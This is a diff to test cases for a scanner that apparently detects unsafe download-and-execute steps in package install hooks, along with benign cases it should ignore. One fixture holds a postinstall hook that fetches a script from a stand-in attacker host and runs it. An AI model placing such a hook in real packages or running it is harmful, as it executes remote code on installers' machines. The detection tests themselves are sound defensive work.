@@ -87,10 +87,8 @@ test("a staged download executed in an install hook is install content", () => {
     "package.json",
     '{"scripts":{"postinstall":"curl -o x.sh https://evil.example/x.sh && ./x.sh"}}\n',
   );
-  // The pair the pipe rules produce for a hook payload: the manifest
-  // text itself, and the hook read as install content.
+  // The extracted hook is executable content; the JSON wrapper is data.
   expect(categories(inspection)).toEqual([
-    "package.json:unsafe-execution:high",
     "package.json#scripts:unsafe-execution:high",
   ]);
 });
@@ -176,4 +174,19 @@ test("a download in one file and an execution in another stay unlinked", () => {
     ],
   });
   expect(categories(inspection)).toEqual([]);
+});
+
+test("quoted data, PATH lookups and non-executing flags do not link a download", () => {
+  for (const body of [
+    "curl -o x.sh https://example.com/x.sh\nsh -n x.sh",
+    "curl -o x.py https://example.com/x.py\npython3 -V x.py",
+    "curl -o tool https://example.com/tool\ntool",
+    'echo "curl -o x.sh https://example.com/x.sh"\nsh x.sh',
+    'curl -o x.sh https://example.com/x.sh\necho "x.sh"',
+  ]) {
+    expect({
+      body,
+      findings: categories(inspected("install.sh", body)),
+    }).toEqual({ body, findings: [] });
+  }
 });
